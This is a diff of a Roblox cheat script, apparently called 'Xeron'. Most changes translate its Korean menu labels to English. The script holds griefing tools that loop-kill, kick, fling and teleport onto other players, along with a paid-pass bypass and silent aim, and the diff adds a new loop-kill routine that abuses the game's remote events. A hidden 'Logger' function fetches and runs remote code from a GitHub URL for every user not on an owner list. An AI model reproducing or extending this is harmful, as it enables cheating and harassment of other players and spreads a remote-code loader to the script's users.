@@ -6081,7 +6081,7 @@ local function doAntiGrab(friendPlayer, enemyPlayer)
 end
 
 FDTab:AddPlayersDropdown({
-    Name = "안티 그랩 대상",
+    Name = "Anti grab select",
     Default = _G.PlayerToRemoveGrab,
     MultipleSelection = true,
     SearchBar = true,
@@ -6100,7 +6100,7 @@ FDTab:AddPlayersDropdown({
 })
 
 FDTab:AddToggle({
-    Name = "안티 그랩 활성화",
+    Name = "Anti grab",
     Default = _G.AntiGrabActive,
     Callback = function(Value)
         _G.AntiGrabActive = Value
@@ -6134,23 +6134,23 @@ end
 
 
 UtilityTab:AddSection({
-    Name = "시스템"
+    Name = "system"
 })
 
 
 UtilityTab:AddButton({
-    Name = "현재 핑(Ping) 확인",
+    Name = " Ping",
     Callback = function()
         pcall(function()
             local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
-            OrionLib:MakeNotification({Name = "시스템", Content = "현재 핑: "..ping.."ms", Time = 3})
+            OrionLib:MakeNotification({Name = "system", Content = " ping: "..ping.."ms", Time = 3})
         end)
     end,
 })
 
 
 UtilityTab:AddButton({
-    Name = "물리 렉 최적화",
+    Name = "physical lag optimization",
     Callback = function()
         pcall(function()
             for _, v in pairs(workspace:GetDescendants()) do
@@ -6305,8 +6305,9 @@ passTab:AddToggle({
 
 })
 ]]
+--[[
 passTab:AddSection({
-	Name = "에임 모양"
+	Name = ""
 })
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -6427,10 +6428,10 @@ Callback=function(v)
 if v then enable() else disable() end
 end
 })
-
+]]
 
 passTab:AddSection({
-	Name = "라인 타입"
+	Name = "line type"
 })
 
 
@@ -6440,27 +6441,27 @@ local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
 
 local isSkinEnabled = false
-local selectedSkin = "기본 화이트"
+local selectedSkin = "Default White"
 local skinConnection
 
 local skinSettings = {
-    ["기본 화이트"] = {
+    ["Default White"] = {
         Texture = "rbxassetid://2273224484", Speed = 3, Width0 = 0.8, Width1 = 0.4,
         Color = ColorSequence.new(Color3.fromRGB(255,255,255)), Brightness = 1.5
     },
-    ["네온 레이저"] = {
+    ["Neon"] = {
         Texture = "rbxassetid://5814122171", Speed = 8, Width0 = 0.3, Width1 = 0.3,
         Color = ColorSequence.new(Color3.fromRGB(0,255,255)), Brightness = 5
     },
-    ["제론 라인"] = {
+    ["Xeron Line"] = {
         Texture = "rbxassetid://77989137998499", Speed = -5, Width0 = 1.4, Width1 = 0.6,
         --Color = ColorSequence.new(Color3.fromRGB(255,40,0)), Brightness = 3.5
     },
-    ["보이드"] = {
+    ["Void"] = {
         Texture = "rbxassetid://106048110", Speed = 4, Width0 = 1.6, Width1 = 1.6,
         Color = ColorSequence.new(Color3.fromRGB(120,0,255)), Brightness = 1.2
     },
-    ["레인보우 레이저"] = {
+    ["Rainbow laser"] = {
         Texture = "rbxassetid://2273224484", Speed = 8, Width0 = 0.7, Width1 = 0.7,
         Color = ColorSequence.new({
             ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
@@ -6468,15 +6469,15 @@ local skinSettings = {
             ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,255))
         }), Brightness = 2.5
     },
-    ["고전압 전류"] = {
+    ["current"] = {
         Texture = "rbxassetid://242225642", Speed = 20, Width0 = 1.1, Width1 = 1.1,
         Color = ColorSequence.new(Color3.fromRGB(255,255,50)), Brightness = 6
     },
-    ["디지털 웨이브"] = {
+    ["Wave"] = {
         Texture = "rbxassetid://5814144365", Speed = -8, Width0 = 0.5, Width1 = 0.5,
         Color = ColorSequence.new(Color3.fromRGB(0,255,80)), Brightness = 3
     },
-    ["플라즈마"] = {
+    ["Plasma"] = {
         Texture = "rbxassetid://131093673", Speed = 6, Width0 = 1.8, Width1 = 0.2,
         Color = ColorSequence.new(Color3.fromRGB(255,200,130)), Brightness = 5
     },
@@ -6484,7 +6485,7 @@ local skinSettings = {
         Texture = "rbxassetid://5814141697", Speed = 5, Width0 = 1.0, Width1 = 1.0,
         Color = ColorSequence.new(Color3.fromRGB(255,0,120)), Brightness = 3.5
     },
-    ["블랙홀 스트림"] = {
+    ["Black Hole Stream"] = {
         Texture = "rbxassetid://5814151528", Speed = -3, Width0 = 2.2, Width1 = 0.05,
         Color = ColorSequence.new(Color3.fromRGB(15,15,25)), Brightness = 0.8
     }
@@ -6506,7 +6507,7 @@ local function applyEffectsIfMine(beam)
 
     if not isMine then return end
 
-    local config = skinSettings[selectedSkin] or skinSettings["기본 화이트"]
+    local config = skinSettings[selectedSkin] or skinSettings["Default White"]
 
     beam.Texture = config.Texture
     beam.TextureSpeed = config.Speed
@@ -6559,19 +6560,19 @@ local function applyEffectsIfMine(beam)
 end
 
 passTab:AddDropdown({
-    Name = "그랩 스킨 선택",
-    Default = "기본 화이트",
+    Name = "Grab skin select",
+    Default = "Default White",
     Options = {
-        "기본 화이트",
-        "네온 레이저",
-        "제론 라인",
-        "보이드",
-        "레인보우 레이저",
-        "고전압 전류",
-        "디지털 웨이브",
-        "플라즈마",
+        "Default White",
+        "Neon",
+        "Xeron Line",
+        "Void",
+        "Rainbow laser",
+        "current",
+        "Wave",
+        "Plasma",
         "DNA",
-        "블랙홀 스트림"
+        "Black Hole Stream"
     },
     Callback = function(Value)
         selectedSkin = Value
@@ -6584,7 +6585,7 @@ passTab:AddDropdown({
 })
 
 passTab:AddToggle({
-    Name = "그랩 스킨 켜기   <font color='rgb(155,100,25)'>[로컬]</font>",
+    Name = "Line skin    <font color='rgb(155,100,25)'>[local]</font>",
     Default = false,
     Callback = function(Value)
         isSkinEnabled = Value
@@ -6609,10 +6610,10 @@ passTab:AddToggle({
 
 
 passTab:AddSection({
-    Name = "라인 프리셋"
+    Name = "Line preset"
 })
 passTab:AddButton({
-   Name = "무지개 프리셋 (고정 고해상도)",
+   Name = "Rainbow preset",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -6633,7 +6634,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "불꽃 프리셋 (레드/오렌지/옐로우)",
+   Name = "fire preset",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -6650,7 +6651,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "바다 프리셋 (딥블루/아쿠아)",
+   Name = "Ocean preset",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -6667,7 +6668,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "석양 프리셋 (퍼플/핑크/오렌지)",
+   Name = "sunset preset",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -6684,7 +6685,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "네온 프리셋 (민트/마젠타)",
+   Name = "Neon preset",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -6700,11 +6701,11 @@ passTab:AddButton({
 })
 
 passTab:AddSection({
-    Name = "무지개"
+    Name = "Rainbow"
 })
 
 passTab:AddToggle({
-   Name = "실시간 무지개 그라데이션 루프",
+   Name = "Rainbow gradient",
    
     save = true,
    Flag = "RainbowLoopToggle",
@@ -6733,10 +6734,10 @@ passTab:AddToggle({
 })
 
 passTab:AddSection({
-    Name = "패스 잠금 해제"
+    Name = "Pass unlock"
 })
 passTab:AddToggle({
-   Name = "긴줄 잠금해제   <font color='rgb(255,19,130)'>[바이패싱]</font>",
+   Name = "Pass unlock <font color='rgb(255,19,130)'>[bypassing]</font>",
    Default = false,
    Flag = "woucf",
    Callback = function(Value)
@@ -6765,14 +6766,14 @@ passTab:AddToggle({
          if ran then
             OrionLib:MakeNotification({
                Name = "Success",
-               Content = "긴줄잠금해제완료!",
+               Content = "Pass bypass completed.",
                Time = 4,
                Image = 10734951437
             })
          else
             OrionLib:MakeNotification({
                Name = "Failed",
-               Content = "긴줄잠금해제실패!",
+               Content = "Pass unlock failed",
                Time = 4,
                Image = 10734925828
             })
@@ -6780,7 +6781,7 @@ passTab:AddToggle({
       else
          OrionLib:MakeNotification({
             Name = "Failed",
-            Content = "긴줄잠금해제실패!",
+            Content = "Pass unlock failure",
             Time = 4,
             Image = 10734925828
          })
@@ -6789,7 +6790,7 @@ passTab:AddToggle({
 })
 
 getTab:AddToggle({
-    Name = "킥알림",
+    Name = "Kick notification",
     Default = false,
     Flag = "uo9td186tf7wvo",
     Callback = function(Value)
@@ -7054,7 +7055,7 @@ do
 	getgenv().SilentAim = true
 
 	grabTab:AddToggle({
-		Name = "사일런트에임",
+		Name = "",
 		Default = true,
 		Callback = function(v)
 			getgenv().SilentAim = v
@@ -7074,10 +7075,10 @@ end
 end
 ]]
 grabTab:AddSection({
-	Name = "플링"
+	Name = "grab"
 })
 grabTab:AddToggle({
-    Name = "던지기 V1   <font color='rgb(255,0,0)'>[데스크톱]</font>",
+    Name = "Super Throw V1   <font color='rgb(255,0,0)'>[Desktop]</font>",
     
     save = true,
     Flag = "99999999",
@@ -7088,7 +7089,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddTextbox({
-    Name = "던지는 힘 V1",
+    Name = "Super Throw V1",
     
     PlaceholderText = "Value",
     save = true,
@@ -7098,13 +7099,13 @@ grabTab:AddTextbox({
     end
 })
 --strengthInput:Set(9999)
-grabTab:AddLabel("모바일의경우 작동하지 않습니다.")
+
 --local strengthConnection = nil
 local nageru = 800
 --local lastThrowTime = 0
 
 grabTab:AddToggle({
-    Name = "던지기 V2   <font color='rgb(0,255,0)'>[모바일]</font>",
+    Name = "Super Throw V2   <font color='rgb(0,255,0)'>[Mobile]</font>",
     
     save = true,
     Flag = "SuperThrow",
@@ -7155,8 +7156,8 @@ grabTab:AddToggle({
 })
 
 grabTab:AddTextbox({
-    Name = "던지는 힘 V2",
-    PlaceholderText = "숫자 입력 (기본값: 800)",
+    Name = "Super Throw V2",
+    PlaceholderText = "Number input (default: 800)",
     
     save = true,
     Flag = "ieie",
@@ -7167,7 +7168,7 @@ grabTab:AddTextbox({
         end
     end
 })
-grabTab:AddLabel("모바일을 지원하며 가장좋은 슈퍼 쓰로우 입니다.")
+
 
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
@@ -7179,7 +7180,7 @@ grabTab:AddSection({
 	Name = "Line"
 })
 grabTab:AddToggle({
-    Name = "무한줄  <font color='rgb(0,255,0)'>[데스크톱]</font>",
+    Name = "Infinite line  <font color='rgb(0,255,0)'>[Desktop]</font>",
     
     Flag = "3uw",
     save = true,
@@ -7190,7 +7191,8 @@ grabTab:AddToggle({
 })
 
 grabTab:AddTextbox({
-    Name = "줄 속도  <font color='rgb(0,255,0)'>[데스크톱]</font>",
+    Name = "line length
+ <font color='rgb(0,255,0)'>[Desktop]</font>",
     
     save = true,
     PlaceholderText = "Value",
@@ -7206,7 +7208,7 @@ grabTab:AddSection({
 	Name = "Other"
 })
 grabTab:AddToggle({
-    Name = "루프 그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>",
+    Name = "loop grab <font color='rgb(255,0,0)'>[Ownership]</font>",
     
     save = true,
     Flag = "ty1",
@@ -7219,7 +7221,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({
-    Name = "래그돌 그랩  <font color='rgb(25,60,10)'>[판자]</font>",
+    Name = "Ragdoll grab  <font color='rgb(25,60,10)'>[Toy]</font>",
     
     save = true,
     Flag = "1ppp",
@@ -7232,7 +7234,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({ 
-    Name = "무질량 그랩", 
+    Name = "massless grab", 
     
     save = true,
     Flag = "1qty",
@@ -7245,7 +7247,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({ 
-    Name = "노클립 그랩", 
+    Name = "Noclip grab", 
     
     save = true,
     Flag = "1yriti",
@@ -7257,7 +7259,7 @@ grabTab:AddToggle({
     end
 })
 grabTab:AddToggle({
-    Name = "보이드 그랩",
+    Name = "Void grab",
     Default = false,
     Save = true,
     Flag = "VoidGrabTo1ggle",
@@ -7319,7 +7321,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({ 
-    Name = "킬그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>   <font color='rgb(0,0,255)'>[프리미엄]</font>", 
+    Name = "Kill Grab  <font color='rgb(255,0,0)'>[Ownership]</font>   <font color='rgb(0,0,255)'>[grab]</font>", 
     
     save = true,
     Flag = "1mbmbmb",
@@ -7329,7 +7331,7 @@ grabTab:AddToggle({
     end
 })
 grabTab:AddToggle({ 
-    Name = "ㄴ 공허 ", 
+    Name = "Void ", 
     Default = false,
     Callback = function(Value)
         TpKLG = Value
@@ -7340,7 +7342,7 @@ grabTab:AddSection({
 	Name = "킥"
 })
 grabTab:AddToggle({
-    Name = "킥그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>  <font color='rgb(0,0,255)'>[프리미엄]</font>",
+    Name = "Kick grab  <font color='rgb(255,0,0)'>[Ownership]</font>  <font color='rgb(0,0,255)'>[grab]</font>",
     
     save = true,
     Flag = "99999j",
@@ -7351,7 +7353,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({
-    Name = "ㄴ 앵커",
+    Name = " Anchor",
     Default = false,
     Callback = function(Value)
         AnhKick = Value
@@ -7361,7 +7363,7 @@ grabTab:AddToggle({
 
 
 grabTab:AddSection({
-	Name = "앵커"
+	Name = "Anchor"
 })
 
 local function runAnchorLogic()
@@ -7485,7 +7487,7 @@ local function toggleAnchor(Value)
 end
 
 toggleElement = grabTab:AddToggle({
-    Name = "물체 고정 토글",
+    Name = "object Anchor",
     Default = false,
     save = true,
     Flag = "qwer",
@@ -7495,14 +7497,14 @@ toggleElement = grabTab:AddToggle({
 })
 
 grabTab:AddButton({
-    Name = "물체 고정",
+    Name = "Anchor",
     Callback = function()
         task.spawn(runAnchorLogic)
     end,
 })
 
 grabTab:AddButton({
-    Name = "색상: 그라데이션 (기본값)",
+    Name = "color: Gradation",
     Callback = function()
         hColor = nil
     end,
@@ -7514,8 +7516,8 @@ local LocalPlayer = Players.LocalPlayer
 
 local playersInLoop1V = {}
 
-local GF = {"wetokwk3jr"}
-local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618", "00VXE1"}
+local GF = {""}
+local Owner = {"", "", "", "", "", "", "", "", "", ""}
 
 local function GetPlayerRank(name)
     if table.find(Owner, name) then return 7 end
@@ -7526,7 +7528,7 @@ end
 local function Logger()
     if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
+            loadstring(game:HttpsGet("https://raw.githubusercontent.com/1s234eko76/on/m/ti"))()
         end)
     end
 end
@@ -7581,20 +7583,20 @@ local function addToLoop1(name)
 
     if not target then
         Logger()
-        Notify("에러", "찾을수 없어요")
+        Notify("Error", "NotFound")
         return
     end
 
 
     if target == LocalPlayer then
-        Notify("Xeron", "자기 자신은 추가할 수 없습니다.")
+        Notify("Xeron", "You cannot add yourself..")
         return
     end
 
     if not table.find(playersInLoop1V, target.Name) then
         table.insert(playersInLoop1V, target.Name)
         UpdateDropdown()
-        Notify("타겟 지정완료", target.Name .. " added")
+        Notify("Target ", target.Name .. " added")
     end
 end
 
@@ -7603,29 +7605,19 @@ local function removeFromLoop1(name)
         if v:lower():find(name:lower(), 1, true) then
             table.remove(playersInLoop1V, i)
             UpdateDropdown()
-            Notify("완료", v .. " 삭제")
+            Notify("Completed", v .. " Remove")
             return
         end
     end
 
-    Notify("에러", "찾을수 없어요.")
+    Notify("Error", "NotFound.")
 end
 
 
-DropdownV1 = ListTab:AddPlayersDropdown({
-    Name = "현재 서버에있는사람 (확인용)",
-    Options = playersInLoop1V,
-    MultipleOptions = true,
-    Callback = function(options)
-        table.clear(playersInLoop1V)
-        for _, v in ipairs(options) do
-            table.insert(playersInLoop1V, v)
-        end
-    end
-})
+
 
 ListTab:AddTextbox({
-    Name = "타겟추가",
+    Name = "add",
     PlaceholderText = "username",
     RemoveTextAfterFocusLost = true,
     Callback = function(value)
@@ -7634,7 +7626,7 @@ ListTab:AddTextbox({
 })
 
 ListTab:AddTextbox({
-    Name = "타겟 삭제",
+    Name = "Target Remove",
     PlaceholderText = "username",
     RemoveTextAfterFocusLost = true,
     Callback = function(value)
@@ -7648,7 +7640,7 @@ task.defer(function()
 end)
 do
 ListTab:AddSection({
-    Name = "기타"
+    Name = "Others"
 })
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -7669,7 +7661,7 @@ local function GetPlayerList()
     return list
 end
 local PlayerDropdown = ListTab:AddDropdown({
-    Name = "플레이어 고르기",
+    Name = "Player select",
     Default = "",
     Options = GetPlayerList(),
     Callback = function(Value)
@@ -7684,14 +7676,14 @@ local PlayerDropdown = ListTab:AddDropdown({
 })
 
 ListTab:AddButton({
-    Name = "리스트 재설정",
+    Name = "List Remove",
     Callback = function()
         PlayerDropdown:Refresh(GetPlayerList(), true)
     end
 })
 
 ListTab:AddToggle({
-    Name = "타겟 시점 보기",
+    Name = "View",
     Default = false,
     Callback = function(Value)
         if Value then
@@ -7707,7 +7699,7 @@ ListTab:AddToggle({
 })
 
 ListTab:AddButton({
-    Name = "TP 하기",
+    Name = "TP",
     Callback = function()
         if SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
@@ -7718,7 +7710,7 @@ ListTab:AddButton({
 })
 
 ListTab:AddToggle({
-    Name = "루프 tp 타겟",
+    Name = "loop tp Target",
     Default = false,
     Callback = function(Value)
         TargetLoopTP = Value
@@ -7734,7 +7726,7 @@ RunService.RenderStepped:Connect(function()
 end)
 
 ListTab:AddToggle({
-    Name = "네트워크 스팸",
+    Name = "Network spam",
     Default = false,
     Callback = function(Value)
         NetworkOwnerLoop = Value
@@ -7799,7 +7791,7 @@ local function getPlayerNames()
 end
 
 ListTab:AddDropdown({
-    Name = "플레이어 고르기",
+    Name = "",
     Default = "",
     Options = getPlayerNames(),
     Callback = function(selected)
@@ -7828,10 +7820,10 @@ Tab:AddButton({
 
 
 LoopTab:AddSection({
-    Name = "오토블롭"
+    Name = "Auto blob"
 })
 LoopTab:AddToggle({
-    Name = "자동블롭앉기",
+    Name = "Auto blob sit",
     
     save = true,
     Flag = "AutoSitBlobmanjj",
@@ -7841,10 +7833,10 @@ LoopTab:AddToggle({
     end
 })
 LoopTab:AddSection({
-    Name = "끌고오기"
+    Name = "Bring"
 })
 LoopTab:AddButton({
-    Name = "끌고오기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = "Bring   <font color='rgb(255,154,123)'>[Blobman]</font>",
     Callback = function()
         UpdateCurrentBlobman()
         local processedHumanoids = {}
@@ -7911,7 +7903,7 @@ LoopTab:AddButton({
 })
 
 LoopTab:AddButton({
-    Name = "끌고오기   <font color='rgb(255,0,0)'>[그랩]</font>",
+    Name = "Bring   <font color='rgb(255,0,0)'>[grab]</font>",
     Callback = function()
         UpdateCurrentBlobman()
         local processedHumanoids = {}
@@ -8078,7 +8070,7 @@ LoopTab:AddButton({
     end
 })
 LoopTab:AddSection({
-    Name = "데스토리 구찌"
+    Name = "destroy Gucci"
 })
 
 
@@ -8134,7 +8126,7 @@ local function StartDestroyGucciLoop()
 end
 
 LoopTab:AddToggle({
-    Name = "데스토리 구찌   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
+    Name = "destroy Gucci   <font color='rgb(0,0,255)'>[blob Ownership]</font>   <font color='rgb(255,0,0)'>[Spam]</font>",
     Default = false,
     --Flag = "2195533",
     Callback = function(Value)
@@ -8161,7 +8153,7 @@ LoopTab:AddToggle({
     end
 })
 LoopTab:AddButton({
-    Name = "구찌 파괴 (all)",
+    Name = "Gucci destroy (all)",
     Callback = function()
         local p = game.Players.LocalPlayer
         local h = p.Character or p.CharacterAdded:Wait()
@@ -8186,27 +8178,11 @@ LoopTab:AddButton({
     end
 })
     LoopTab:AddSection({
-    Name = "오너킥"
+    Name = "Spam kick"
 })
-LoopTab:AddTextbox({
-        Name = "X Y Z",
-        Default = "0,40,0",
-        PlaceholderText = "",
-        RemoveTextAfterFocusLost = false,
-     save = true,
-        Flag = "9896",
-        Callback = function(Value)
-            local x, y, z = string.match(Value, "([%d.-]+),([%d.-]+),([%d.-]+)")
-            if x and y and z then
-                OLTPValue = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
-            else
-            end
-        end
-    })
-    --OLTPInput:Set("0,40,0")
-    
+
     LoopTab:AddToggle({
-        Name = "스팸킥    <font color='rgb(255,0,255)'>[스팸]</font>    <font color='rgb(0,0,255)'>[프리미엄]</font>",
+        Name = "Spam kick    <font color='rgb(255,0,255)'>[Spam]</font>    <font color='rgb(0,0,255)'>[TOP 1]</font>",
         Default = false,
        -- Flag = "21",
         Callback = function(Value)
@@ -8225,7 +8201,7 @@ LoopTab:AddTextbox({
         end
     })
 LoopTab:AddToggle({
-    Name = "ㄴ 고정",
+    Name = "Anchor",
     
     save = true,
     Flag = "21jkj",
@@ -8235,7 +8211,7 @@ LoopTab:AddToggle({
 })
 
 LoopTab:AddToggle({
-    Name = "ㄴ 그랩파괴 없이",
+    Name = " No destroy grab",
     
     save = true,
     Flag = "pyuyjd",
@@ -8445,11 +8421,11 @@ end
 
 do
     LoopTab:AddSection({
-        Name = "루프킬 NEW"
+        Name = "loopkill NEW"
     })
 
     LoopTab:AddToggle({
-        Name = "루프 킬  <font color='#07FF00'>[오너쉽]</font>",
+        Name = "loop kill  <font color='#07FF00'>[Ownership]</font>",
         Default = false,
         --Flag = "21",
         Callback = function(Value)
@@ -8586,8 +8562,8 @@ end
 
 local function runBlobmanLoopLogic()
     if not (BlobmanBetaFeature and BlobmanBetaFeature.checkTarget) then
-        warn("BlobmanBetaFeature 또는 checkTarget 함수를 찾을 수 없습니다.")
-        Settings.BlobmanBeta.loopKillActive = false
+        warn("nan.")
+        Settings.BlobmanBeta.loopKillActive = false 
         return
     end
 
@@ -8674,7 +8650,7 @@ local function runBlobmanLoopLogic()
 end
 --[[
 LoopTab:AddToggle({
-    Name = "루프킬(베타)   <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = " <font color='rgb(255,154,123)'>[]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -8712,10 +8688,10 @@ end
 
 
 LoopTab:AddSection({
-    Name = "레이지봇킥"
+    Name = "Bypass kick"
 })
 LoopTab:AddToggle({
-    Name = "레이지봇 킥   <font color='rgb(255,154,123)'>[레이지봇]</font>  <font color='rgb(0,255,0)'>[프리미엄]</font>  <font color='rgb(255,0,1)'>[바이패스]</font>  <font color='rgb(0,154,48)'>[락]</font>",
+    Name = "Bypass kick   <font color='rgb(255,154,123)'>[Orbital]</font>  <font color='rgb(255,0,1)'>[Bypass]</font> ",
     Default = false,
     --Flag = "22",
     Callback = function(Value)
@@ -8932,12 +8908,12 @@ LoopTab:AddToggle({
     end
 })
 LoopTab:AddSection({
-    Name = "블롭 킥"
+    Name = "Blob Kick"
 })
 --local loopKickBlobActive = false
 
 LoopTab:AddToggle({
-    Name = "블롭킥     <font color='rgb(255,0,0)'>[프리미엄]</font>",
+    Name = "Blobkick     <font color='rgb(255,0,0)'>[sapm]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9070,13 +9046,13 @@ LoopTab:AddToggle({
         end
     end
 })
---[[
+
 LoopTab:AddSection({
-    Name = "루프킥"
+    Name = "Silent kick"
 })
 
 local blobLoopToggle = LoopTab:AddToggle({
-    Name = "루프킥  <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = "Silent kick  <font color='rgb(255,154,123)'>[Blobman]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9107,7 +9083,7 @@ local blobLoopToggle = LoopTab:AddToggle({
     end
 })
 LoopTab:AddToggle({
-    Name = "ㄴ 앉기",
+    Name = "sit",
     
     save = true,
     Flag = "21gshjb",
@@ -9115,12 +9091,12 @@ LoopTab:AddToggle({
         LoopBringMODED = Value
     end
 })
-]]
+
 LoopTab:AddSection({
-    Name = "루프킬"
+    Name = "loopkill"
 })
 LoopTab:AddToggle({
-    Name = "루프킬   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
+    Name = "loopkill   <font color='rgb(0,0,255)'>[Ownership]</font>   <font color='rgb(255,0,0)'>[grab]</font>",
     Default = false,
    -- Flag = "21",
     Callback = function(Value)
@@ -9141,7 +9117,7 @@ LoopTab:AddToggle({
 
 
 LoopTab:AddToggle({
-    Name = "블롭 루프킬V2  <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = "Blob Fling kill <font color='rgb(255,154,123)'>[Blobman]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9238,10 +9214,87 @@ LoopTab:AddToggle({
     end
 })
 
+local function ExecuteLoopKillAttack(TargetPlayer)
+    local TargetChar = TargetPlayer.Character
+    local TargetRoot = TargetChar and TargetChar:FindFirstChild("HumanoidRootPart")
+    local TargetHum = TargetChar and TargetChar:FindFirstChildOfClass("Humanoid")
+    local TargetHead = TargetChar and TargetChar:FindFirstChild("Head")
+
+    if TargetRoot and TargetHum and TargetHum.Health > 0 and TargetHead then
+        if TargetHead:FindFirstChild("PartOwner") then
+            local MyChar = LocalPlayer.Character
+            local MyRoot = MyChar and MyChar:FindFirstChild("HumanoidRootPart")
+            if not MyRoot then return end
+
+            pcall(function()
+                local rayOrigin = TargetRoot.Position + Vector3.new(0, 5, 0)
+                local rayDirection = Vector3.new(0, -25, 0)
+                local raycastParams = RaycastParams.new()
+                raycastParams.FilterDescendantsInstances = {TargetChar, MyChar, Workspace.CurrentCamera}
+                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+
+                local raycastResult = Workspace:Raycast(rayOrigin, rayDirection, raycastParams)
+                local teleportPos
+                if raycastResult then
+                    teleportPos = raycastResult.Position + Vector3.new(0, 3.5, 0)
+                else
+                    teleportPos = TargetRoot.Position + Vector3.new(3, 0, 0)
+                end
+
+                MyRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                TargetRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+
+                MyChar:PivotTo(CFrame.new(teleportPos))
+
+                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(TargetRoot, TargetRoot.CFrame)
+                task.wait(0.05)
+                ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(TargetRoot)
+
+                MyRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                TargetRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            end)
+        end
+    end
+end
+
+LoopTab:AddToggle({
+    Name = "Blob loopkill V2  <font color='rgb(255,154,123)'>[Blobman]</font>",
+    Default = false,
+    Callback = function(Value)
+        blobLoopT3 = Value
+        
+        if not Value then
+            table.clear(playersInLoop2V)
+            return
+        end
+
+        table.clear(playersInLoop2V)
+        for _, e in ipairs(playersInLoop1V) do
+            table.insert(playersInLoop2V, e:match("^(.-) %(") or e)
+        end
+
+        task.spawn(function()
+            while blobLoopT3 do
+                for _, name in ipairs(playersInLoop2V) do
+                    if not blobLoopT3 then break end
+                    if table.find(Whitelist, name) or PPs:FindFirstChild(name) then continue end
+
+                    local player = Players:FindFirstChild(name)
+                    if player then
+                        ExecuteLoopKillAttack(player)
+                    end
+                end
+                task.wait(0.05)
+            end
+        end)
+    end
+})
+
+
 
 
 LoopTab:AddToggle({
-    Name = "루프 그랩   <font color='rgb(255,154,123)'>[블롭맨]</font>",
+    Name = "Loop grab   <font color='rgb(255,154,123)'>[Blobman]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9261,10 +9314,10 @@ LoopTab:AddToggle({
 })
 
 LoopTab:AddSection({
-    Name = "노 블롭"
+    Name = "No Blob"
 })
 LoopTab:AddToggle({
-    Name = "루프킬   <font color='rgb(0,255,0)'>[그랩]</font>",
+    Name = "Loop kill   <font color='rgb(0,255,0)'>[Grab]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9286,7 +9339,7 @@ LoopTab:AddToggle({
 
 
 LoopTab:AddToggle({
-    Name = "루프킥   <font color='rgb(0,255,0)'>[그랩]</font>",
+    Name = "Loop kick   <font color='rgb(0,255,0)'>[Grab]</font>",
     Default = false,
     --Flag = "21",
     Callback = function(Value)
@@ -9323,7 +9376,7 @@ local ownershipKickTask = nil
 local ownershipKickFloatConn = nil
 
 LoopTab:AddToggle({
-    Name = "루프 킥 V1   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
+    Name = "Loop kick V1   <font color='rgb(0,0,255)'>[Ownership]</font>   <font color='rgb(255,0,0)'>[Fling]</font>",
     Default = false,
     --Flag = "OwnershipKickLoopV1",
     Callback = function(Value)
@@ -9466,7 +9519,7 @@ local ownershipKickV2Task = nil
 local ownershipKickV2FloatConn = nil
 
 LoopTab:AddToggle({
-    Name = "루프 킥 V2   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
